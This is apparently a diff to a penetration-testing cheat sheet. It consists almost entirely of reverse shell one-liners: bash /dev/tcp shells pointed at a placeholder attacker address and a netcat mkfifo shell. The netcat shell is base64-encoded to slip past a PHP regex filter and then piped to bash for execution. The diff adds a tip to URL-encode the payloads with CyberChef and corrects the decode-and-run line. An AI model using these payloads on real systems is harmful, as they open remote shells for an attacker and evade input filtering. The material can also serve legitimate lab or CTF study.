@@ -1089,6 +1089,7 @@ sh -i >& /dev/tcp/ IP_ATTACK/4444 0>&1
 bash -i >& /dev/tcp/ IP_ATTACK/4444 0>&1
 bash -c 'bash -i >& /dev/tcp/IP_ATTACK/666 0>&1'
 /bin/bash "/bin/bash -i 5<> /dev/tcp/IP_ATTACK/4444 0<&5 1>&5 2>&5"
+# or URL Encode the previous ones using CyberChef
 ```
 
 - Also, if the php script has a regex, you can encode to base64 a netcat shell like:
@@ -1096,8 +1097,8 @@ bash -c 'bash -i >& /dev/tcp/IP_ATTACK/666 0>&1'
 ```shell
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_ATTACK PORT >/tmp/f" | base64
 
-#Then pipe it
-cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTQuNjkuMSA2NjYgPi90bXAvZgo | base64 -d | bash
+#Then pipe it to execute a bash
+echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTQuNjkuMSA2NjYgPi90bXAvZgo" | base64 -d | bash
 ```
 
 ---
